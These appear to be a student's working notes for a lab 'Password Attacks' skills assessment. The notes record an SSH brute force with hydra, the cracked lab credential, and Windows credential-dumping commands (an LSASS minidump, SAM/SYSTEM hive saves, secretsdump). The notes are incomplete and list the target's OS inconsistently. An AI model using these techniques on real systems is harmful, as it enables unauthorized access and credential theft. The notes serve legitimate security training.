# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
> ⚠️ IP changes on restart — confirm current IP before starting.
> **Updated:** 2026-04-18 11:03 UTC+8

---

## Assessment Checklist

- [x] Foothold (initial access) — SSH brute force
- [x] Local enumeration — Linux system, dual NICs, no sudo
- [ ] Pivot to internal network (172.16.119.0/24)
- [ ] Password attacks (local or remote)
- [ ] Privilege escalation
- [ ] Flag(s)

---

## 1. Recon

### Target Information
- **Hostname:** DMZ01
- **OS:** Linux Ubuntu 5.4.0-216-generic
- **Architecture:** x86_64

### Network Interfaces
| Interface | IP Address | Network | Notes |
|-----------|------------|---------|-------|
| ens160 | 10.129.234.116/16 | 10.129.0.0/16 | External/VPN facing |
| ens192 | 172.16.119.13/24 | 172.16.119.0/24 | Internal network |
| lo | 127.0.0.1 | loopback | |

### Users on System
- **root** (uid=0) — target for privilege escalation
- **lab_adm** (uid=1000) — potential lateral movement target
- **jbetty** (uid=1001) — current user, no sudo rights

### Initial Access — SSH Brute Force

**Victim:** Betty Jayde (Nexura LLC)

```bash
# Generate usernames from name
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt

# Brute force SSH (use single quotes for special chars: !$@#)
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
```

**Result:** `jbetty / Texas123!@#`

**Connect:**
```bash
ssh jbetty@10.129.234.116
# Password: Texas123!@#
```

### Enumeration Summary
```bash
id
# uid=1001(jbetty) gid=1001(jbetty) groups=1001(jbetty)

sudo -l
# Sorry, user jbetty may not run sudo on DMZ01.

echo $SHELL
# /bin/bash
```

**Key Finding:** DMZ01 has dual network interfaces — foothold on 10.129.x.x with access to internal 172.16.119.0/24 network. Pivoting required to reach internal targets.

---

## 3. Privilege Escalation

### Techniques

```bash
# LSASS dump
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# SAM/SYSTEM dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Crack with secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

## 4. Flags

| Flag | Location | Method |
|------|----------|--------|
| user.txt | | |
| root.txt | | |

---

## Lessons Learned

